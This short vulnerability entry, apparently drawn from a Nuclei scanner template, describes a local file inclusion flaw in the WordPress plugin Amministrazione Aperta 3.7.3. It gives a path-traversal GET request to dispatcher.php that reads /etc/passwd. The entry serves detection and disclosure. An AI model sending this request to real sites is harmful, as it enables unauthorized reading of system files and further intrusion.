# Vulnerability: WordPress Amministrazione Aperta 3.7.3 - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`amministrazione-aperta-lfi.yaml`)

## Description
WordPress Amministrazione Aperta 3.7.3 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/amministrazione-aperta/wpgov/dispatcher.php?open=../../../../../../../../../../etc/passwd
```

